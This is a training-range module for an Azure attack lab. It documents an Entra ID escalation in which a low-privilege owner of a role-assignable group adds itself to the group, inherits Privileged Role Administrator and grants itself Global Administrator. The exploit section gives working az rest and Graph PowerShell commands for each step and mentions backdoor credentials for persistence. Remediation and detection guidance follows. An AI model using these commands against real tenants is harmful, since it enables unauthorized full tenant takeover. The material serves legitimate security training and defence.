# AP03 — Low-privilege owner over a role-assignable group → self-add → Global Administrator

- **Layer:** Entra ID (role-assignable groups · directory roles)
- **Cost:** ~zero dollars (identity-only, no compute) — **but requires Entra ID P1**: *role-assignable* groups (`isAssignableToRole = true`) do not exist in Entra Free, so, unlike AP01, this AP needs a dev/E5 tenant with P1. Teardown with `azrange.ps1 reset` / `destroy`, session cost 0.
- **MITRE ATT&CK:** [T1098](https://attack.mitre.org/techniques/T1098/) (Account Manipulation) · [T1098.003](https://attack.mitre.org/techniques/T1098/003/) (Account Manipulation: Additional Cloud Roles) · [T1078.004](https://attack.mitre.org/techniques/T1078/004/) (Valid Accounts: Cloud Accounts)
- **Maps to cert:** CARTP / CARTE (adjacent defensive side: SC-300, AZ-500)
- **Precondition seeded by the range:**
  - Security group `azrange-ap03-role-admins` (`azuread_group.ap03_role_admins`) with **`assignable_to_role = true`** (role-assignable, requires P1) and **empty static membership** (`members = []`).
  - The **low-privilege** user `azrange-user1` (reuses `azuread_user.lab[0]`; UPN `azrange-user1@<tenant_domain>`) is the **sole owner** of the group (`owners = [azuread_user.lab[0].object_id]`) — the misconfigured link.
  - The group **carries the directory role `Privileged Role Administrator`** (template_id `e8611ab8-c189-46e8-94e1-60213ab1f814`), instantiated with `azuread_directory_role.ap03_pra` and assigned **to the group** with `azuread_directory_role_assignment.ap03_pra` → all of its members inherit PRA.
  - Everything wired by Terraform (`enable_ap03 = true`) inside the existing `entra-identity` module, **100% declarative — no post-deployment seed**. The exploitation step (the owner self-adds to the membership) **is not seeded**: it is default Entra behavior triggered by the student.
  - **Deploy-permission precondition (not a vulnerable-state seed):** the principal running `terraform apply` must hold **`Privileged Role Administrator` or `Global Administrator`** (and the `RoleManagement.ReadWrite.Directory` app-role) in order to create the role-assignable group and assign PRA to it.

---

## 🎯 Learning objective

Have the student internalize that **group ownership is a delegated write permission**, and that when such a group is *role-assignable* and carries a directory role, the owner inherits an escalation path that **does not depend on any administrator role, any tenant policy, or any self-writable attribute**. The core is a default Entra authorization rule: the membership of a *role-assignable* group can be modified by **only** three principals — `Global Administrator`, `Privileged Role Administrator`, and the group's **owners** (Microsoft explicitly documents that membership management of these groups is delegated *by adding owners*). Thus a low-privilege user who is an owner can **self-add as a member**, inherit the `Privileged Role Administrator` role by group membership, and with it **self-grant `Global Administrator`** (tenant takeover). This is the canonical `AZOwns → role-assignable group → role` edge from BloodHound/AzureHound.

The conceptual axis is that the flaw is **not** the self-add (legitimate owner behavior) but the **poorly audited combination**: delegated ownership for "self-service" + a group that is later marked role-assignable or receives a privileged role, with ownership never re-audited against that assignment. This is a **high real-world frequency** pattern.

> **Why this primitive and not a self-editable attribute (AP03-bis).** The "intuitive" variant — a user rewrites a profile attribute (`department`, `jobTitle`) that feeds a **dynamic membership rule** of a privileged group — **is not used as the basis** for two technical reasons, both pedagogical:
> 1. In Entra, `PATCH /me` only lets the user touch a **subset** of M365 profile fields; the directory properties consumed by dynamic rules (e.g. `department`) are **admin-only by default**. Making them self-writable would require **seeding an extra admin delegation** — exactly the realism flaw to avoid.
> 2. A *role-assignable* group **must** have static membership (`Assigned`): Entra **forbids dynamic membership** in these groups **precisely to prevent this attribute-injection**. Understanding that restriction is part of the *fix*.
>
> This is why AP03 is built on **ownership** (real, default self-add, no admin precondition) and tops out in a REAL Entra directory role; the dynamic variant is documented as a *sidebar* to teach the boundary.

---

## 🔴 Exploit (how it is abused)

Training grade. Public reference tools: **az cli** (`az rest`), **Microsoft Graph PowerShell** (`Microsoft.Graph`), **ROADtools** (`roadrecon`), **AzureHound**/**BloodHound**.

The entire flow runs **with the token of the low-privilege user `azrange-user1`** — there is no administrator role to start with.

1. **Reconnaissance with low-privilege credentials (T1098 — recon of the `AZOwns` edge).** Authenticate as `azrange-user1` and enumerate the objects it owns; filter down to *role-assignable* groups:
   ```bash
   az login --allow-no-subscriptions   # user azrange-user1@<tenant_domain>
   # Objects I OWN -> filter to groups and see which ones are role-assignable.
   # NOTE on JMESPath: a field containing '@' or '.' is referenced with DOUBLE quotes ("@odata.type");
   # with SINGLE quotes it would be a LITERAL and the filter would ALWAYS come back empty (blank table).
   az rest --method GET \
     --uri "https://graph.microsoft.com/v1.0/me/ownedObjects" \
     --query "value[?\"@odata.type\"=='#microsoft.graph.group'].{name:displayName,id:id,roleAssignable:isAssignableToRole}" -o table
   # (isAssignableToRole is returned by default on group objects; server-side alternative with a type-cast:
   #  .../me/ownedObjects/microsoft.graph.group?\$select=id,displayName,isAssignableToRole )
   ```
   With the graph: `azurehound -u azrange-user1@<tenant_domain> list groups --tenant <tenantId>` and follow the `AZOwns` edge → group with `isAssignableToRole=true` in BloodHound; or `roadrecon gather` + `roadrecon plugin` for the same goal offline.

2. **Confirm the target.** Verify that `azrange-ap03-role-admins` is role-assignable and which role it carries:
   ```bash
   # Role-assignable?
   az rest --method GET \
     --uri "https://graph.microsoft.com/v1.0/groups/<groupId>?\$select=displayName,isAssignableToRole"

   # Which directory role does the group carry? (the group is the principal of the assignment)
   az rest --method GET \
     --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$filter=principalId+eq+'<groupId>'"
   # → roleDefinitionId e8611ab8-c189-46e8-94e1-60213ab1f814 = Privileged Role Administrator.
   #   All members of the group inherit that role.
   ```

3. **Abuse ownership — self-add (T1098 · Account Manipulation).** As **owner** of the role-assignable group, self-add to the membership. Entra authorizes it without an admin role because, by default, the membership of a role-assignable group can be touched only by GA, PRA, and the **owners**:
   ```bash
   # My own object id:
   MYID=$(az ad signed-in-user show --query id -o tsv)

   az rest --method POST \
     --uri "https://graph.microsoft.com/v1.0/groups/<groupId>/members/\$ref" \
     --headers "Content-Type=application/json" \
     --body "{\"@odata.id\":\"https://graph.microsoft.com/v1.0/directoryObjects/$MYID\"}"
   ```
   Equivalent with Microsoft Graph PowerShell:
   ```powershell
   # The membership of a role-assignable group is NOT managed with Group.ReadWrite.All /
   # GroupMember.ReadWrite.All: Graph requires RoleManagement.ReadWrite.Directory (see note).
   # User.Read lets you resolve your own object id.
   Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory","User.Read"
   $myId   = (Get-MgUser -UserId (Get-MgContext).Account).Id   # Account is the UPN, not the GUID -> you must resolve the object id
   $params = @{ "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$myId" }
   New-MgGroupMemberByRef -GroupId <groupId> -BodyParameter $params
   ```
   > **Authorization note — OAuth client scope vs. group ownership.** The self-add needs two independent things: (1) that the **OAuth client** carries a sufficient Graph scope and (2) **directory authorization** over THIS group. For a *role-assignable* group, Microsoft requires `RoleManagement.ReadWrite.Directory` to manage its membership — **`Group.ReadWrite.All` / `GroupMember.ReadWrite.All` do not work**. The `az rest` path above works because Azure CLI is a first-party app with broad **pre-consented** scopes (`Directory.AccessAsUser.All`, which delegates all of the user's authorization), so the real boundary becomes **group ownership** (Entra delegates membership management of role-assignable groups, by design, by adding owners). By contrast `Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"` requires **admin consent**: a low-privilege user **cannot** self-grant that scope in a standard tenant. In short: being an **owner** provides the directory authorization; the client scope only enables the class of operation.

4. **Materialize the inherited role (T1098.003 · Additional Cloud Roles).** Membership propagates `Privileged Role Administrator` to the identity, **but the current token does not reflect it**: you must **re-authenticate** so the `wids`/`roles` claims pick up the role (propagation latency — not a failure of the attack):
   ```bash
   az logout && az login --allow-no-subscriptions   # new token

   # Verify the membership and the inherited role:
   az rest --method GET --uri "https://graph.microsoft.com/v1.0/me/memberOf" \
     --query "value[].displayName"
   # Inspect the token claims (wids includes the PRA template):
   az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv \
     | cut -d. -f2 | base64 -d 2>/dev/null | jq '.wids, .roles'
   ```
   > **Pedagogical caveat — latency.** If right after the self-add it looks like it "didn't work", it is almost always because the token is still the old one. Force a new token (or wait for propagation) before concluding the step failed.

5. **Final escalation (T1078.004 · Valid Accounts: Cloud Accounts).** With `Privileged Role Administrator` — a **Tier-0** role that can grant *any* role — self-assign (or assign to a controlled SP) `Global Administrator` (template_id `62e90394-69f5-4237-9190-012177145e10`) → full tenant control:
   ```bash
   az rest --method POST \
     --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
     --headers "Content-Type=application/json" \
     --body "{\"principalId\":\"$MYID\",\"roleDefinitionId\":\"62e90394-69f5-4237-9190-012177145e10\",\"directoryScopeId\":\"/\"}"
   ```
   PowerShell equivalent:
   ```powershell
   New-MgRoleManagementDirectoryRoleAssignment -PrincipalId <myObjectId> `
     -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" -DirectoryScopeId "/"
   ```
   **Persistence alternative:** instead of (or in addition to) GA, add credentials (password/cert) to privileged applications/SPs — a backdoor that survives a membership reset.

6. **Persistence / stealth (pedagogical).** Keeping the group membership **retains access**: ownership + role-assignable is both an **access path and a persistence path**. Key teardown observation: **every object created after reaching GA** (apps, SPs, credentials, other role assignments) falls **outside the Terraform state** and must be cleaned up by hand — same *out-of-state scope* caveat as AP02.

7. **Teardown.** `./azrange.ps1 reset` re-applies with `enable_ap03 = false` (`count = 0`) → destroys the group and the role assignment and **reverts the self-add**; `members = []` also reverts it on any intermediate re-apply. Objects created after escalating to GA are cleaned up by hand.

---

## 🟢 Remediate (remediation)

1. **Re-audit the OWNERSHIP of every role-assignable group.** No low-privilege user should be an owner of a group that carries directory roles. Remove the user as owner or remove `assignable_to_role` / the group's role assignment:
   ```powershell
   # Enumerate role-assignable groups and their owners:
   Get-MgGroup -Filter "isAssignableToRole eq true" -All |
     ForEach-Object {
       [pscustomobject]@{ Group = $_.DisplayName; Owners = (Get-MgGroupOwner -GroupId $_.Id).AdditionalProperties.userPrincipalName }
     }

   # Remove the low-privilege owner:
   Remove-MgGroupOwnerByRef -GroupId <groupId> -DirectoryObjectId <userObjectId>
   ```
   In the lab: `./azrange.ps1 reset` (`enable_ap03 = false`).

2. **Prefer assigning roles to individual users via Microsoft Entra PIM** (eligible, JIT activation with approval and MFA) instead of permanent assignment to groups. If role group-assignment is used, **restrict group ownership exclusively to administrators**. Do not manage privileged groups through self-service flows.

3. **Enable Restricted Management (Restricted Management Administrative Units) for role-assignable groups** and verify that only `Global Administrator` / `Privileged Role Administrator` manage their membership; remove delegated owners inherited from self-service flows.

4. **Treat `Privileged Role Administrator` as a Tier-0 role.** It can grant ANY role, `Global Administrator` included. Minimize its assignments, require PIM+MFA, and monitor it as a top priority:
   ```powershell
   # Inventory of who holds PRA (direct or via group):
   Get-MgRoleManagementDirectoryRoleAssignment `
     -Filter "roleDefinitionId eq 'e8611ab8-c189-46e8-94e1-60213ab1f814'" -ExpandProperty principal
   ```

5. **Recurring access reviews (Entra ID Governance)** over owners and membership of privileged groups; alert in AuditLogs on `Add owner to group` and `Add member to group` targeting role-assignable groups, and on directory-role assignments to groups.

6. **Pedagogical — why Entra already blocks the dynamic variant (AP03-bis).** A role-assignable group **requires static membership** (`Assigned`): Microsoft **forbids** dynamic membership in these groups precisely to prevent *attribute-injection* (escalating by rewriting an attribute that feeds the rule). Do not try to "fix" the problem with dynamic rules over self-writable attributes — that is the anti-pattern; understanding that restriction **is** part of the fix.

> **Teardown notice.** `reset` reverts the self-add and destroys the group + assignment, but **any object created after escalating to `Global Administrator`** (apps, SPs, credentials, new role assignments) falls **outside the Terraform state** and must be cleaned up by hand — same scope caveat as AP02.

---

## 🔵 Detect

The telltale events are in the **Entra ID Audit Logs**: `Add owner to group` (seeding/abuse of ownership), **`Add member to group`** targeting a role-assignable group (the self-add), `Add member to role`/`Add eligible/scoped member to role` (inheritance or self-assignment of a directory role) and, above all, the **assignment of `Global Administrator`** shortly afterward.

- KQL (Sentinel / Defender XDR): [`detections/kql/AP03-role-assignable-group.kql`](../../detections/kql/AP03-role-assignable-group.kql)
- Sigma: [`detections/sigma/AP03-role-assignable-group.yml`](../../detections/sigma/AP03-role-assignable-group.yml)

Complementary hunting signals:
- **`Add member to group` whose `TargetResources` is a group with `isAssignableToRole = true` and whose `InitiatedBy` is a low-privilege user** who is also an **owner** of the group — this is the self-add that materializes the escalation. The owner↔member correlation is the gold signal.
- Tight temporal sequence: `Add member to group` (role-assignable group) → new authentication by the same principal → **`Add member to role` / assignment of `Global Administrator`** by that same `objectId`.
- `Add owner to group` that sets a **non-administrator user** as owner of a group that carries (or will carry) a directory role — a provisioning anomaly.
- Assignment of a **directory role to a group** (`Add member to role` with `TargetResources` of type *Group*), especially Tier-0 roles (`Privileged Role Administrator`, `Global Administrator`).
- Any `Privileged Role Administrator` activity granting roles: by design it is able to self-escalate to GA, so it must be treated as a top-priority event.

---

## 📚 References

- Microsoft — [Create a role-assignable group in Microsoft Entra ID](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/groups-create-eligible)
- Microsoft — [Use Microsoft Entra groups to manage role assignments](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/groups-concept)
- Microsoft — [Privileged Role Administrator — built-in roles](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference#privileged-role-administrator)
- Microsoft — [Microsoft Entra Privileged Identity Management (PIM)](https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-configure)
- SpecterOps — [AzureHound / BloodHound: AZOwns and group-based escalation](https://bloodhound.specterops.io/)
- MITRE ATT&CK — T1098, T1098.003, T1078.004
